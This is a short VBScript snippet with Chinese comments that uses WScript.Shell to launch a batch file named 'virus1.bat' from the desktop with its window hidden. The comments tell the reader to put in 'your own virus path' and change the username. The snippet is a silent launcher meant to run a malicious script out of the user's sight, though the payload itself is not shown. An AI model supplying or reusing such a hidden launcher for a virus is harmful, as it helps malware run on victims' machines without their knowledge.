set ws=WScript.CreateObject("WScript.Shell") 
rem vbscript同样可以用rem做注释
rem 下面搞自己的病毒路径，这里写的是桌面，Administrator是用户名，得改
ws.Run "C:\\Users\\Administrator\\Desktop\\virus1.bat /start",0